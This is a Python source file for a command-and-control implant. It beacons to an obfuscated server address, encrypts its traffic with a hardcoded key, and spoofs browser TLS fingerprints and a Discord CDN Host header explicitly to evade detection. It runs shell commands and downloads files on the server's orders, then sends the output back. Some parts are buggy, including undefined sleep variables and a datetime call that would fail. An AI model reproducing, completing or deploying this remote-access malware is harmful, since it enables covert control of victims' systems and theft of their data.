import time, datetime, uuid, random, requests, subprocess, json
import base64
from cryptography.fernet import Fernet
import tls_client

########################################################################################################################################################

# Config
SERVER_URL = base64.b64decode("aHR0cDovLzE5Mi4xNjguMS42MDo1MDAw").decode() # base64 encoded
BEACON_ENDPOINT = "/api/status"
RESULT_ENDPOINT = "/api/upload"

# Unique agent ID
AGENT_ID = str(uuid.uuid4())
print(f"[+] Agent ID: {AGENT_ID}")

# Some basic user-agents for headers 
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
]

headers = {
    "User-Agent": random.choice(USER_AGENTS),
    "Authorization": f"Bearer {AGENT_ID}",
    "X-Session-ID": str(uuid.uuid4())
}

# Encrypting our json files
SECRET_KEY = b'aStjls8ICJRMcDGRftikxQl9JTUOckWUEs_AhRJNpaQ=' # Must be same on client and server
cipher = Fernet(SECRET_KEY)

def encrypt_data(data):
    encoded = data.encode()
    encrypted = cipher.encrypt(encoded)
    return encrypted.decode()

def decrypt_data(data):
    decrypted = cipher.decrypt(data.encode())
    return decrypted.decode()


########################################################################################################################################################

# Beacon out to our C2 to check for tasking
def beacon():
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Authorization": f"Bearer {AGENT_ID}",
        "X-Session-ID": str(uuid.uuid4()),
        "Host": "cdn.discordapp.com" # EXAMPLE HOST HEADER TO EVADE HUMAN DETECTION, will add on this later 
        }
    
    payload = {"id": AGENT_ID}
    encrypted_payload = encrypt_data(json.dumps(payload))
    try:
        session = tls_client.Session(client_identifier="chrome_112")

        response = session.post(SERVER_URL + BEACON_ENDPOINT, json={"data": encrypted_payload}, headers=headers, timeout=10) 
        if response.status_code == 200: 
            data = response.json() 
            task = data.get("task") 
            if task: 
                execute_task(task) 
    except Exception as e:
        print(f"[!] Beacon error: {e}")


########################################################################################################################################################

# Execute the tasks (if any)
def execute_task(task_data):

    task_type = task_data.get("type")

    if task_type == "shell":
        command = task_data.get("command")
        run_shell(command)
    elif task_type == "download":
        url = task_data.get("url")
        save_as = task_data.get("save_as")
        download_file(url, save_as)
    elif task_type == "sleep":
        global SLEEP_MIN, SLEEP_MAX
        SLEEP_MIN = task_data.get("min", SLEEP_MIN)
        SLEEP_MAX = task_data.get("max", SLEEP_MAX)
    else:
        print(f"[!] Unknown task type: {task_type}")


######################## SUBPROCESSES FOR EXECUTION

def run_shell(command): # subprocess command
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        post_result(result.decode())
    except subprocess.CalledProcessError as e:
        post_result(e.output.decode())

def download_file(url, save_as): # subprocess command
    try:
        response = requests.get(url, stream=True)
        with open(save_as, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        post_result(f"[+] Downloaded {url} as {save_as}")
    except Exception as e:
        post_result(f"[!] Download error: {str(e)}")
        
import time
def dynamic_sleep():
    current_hour = datetime.now().hour

    if 9 <= current_hour <= 17:
        return random.randint(10, 30)
    else:
        return random.randint(10 * 2, 30 * 3)

########################################################################################################################################################

# Send a request to the /result endpoint that shows the results of the executed task
def post_result(result):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Authorization": f"Bearer {AGENT_ID}",
        "X-Session-ID": str(uuid.uuid4()),
        "Host": "cdn.discordapp.com" # EXAMPLE HOST HEADER TO EVADE HUMAN DETECTION, will add on this later 
        }
    
    payload = {"id": AGENT_ID, "output": result}
    encrypted_payload = encrypt_data(json.dumps(payload))
    try:
        session = tls_client.Session(client_identifier="chrome_112")
        session.post(SERVER_URL + RESULT_ENDPOINT, json={"data": encrypted_payload}, headers=headers, timeout=10) 
    except Exception as e:
        print(f"[!] Result posting error: {e}")


########################################################################################################################################################

def main():
    while True: 
        beacon()
        sleep_time = dynamic_sleep()

if __name__ == "__main__":
    main()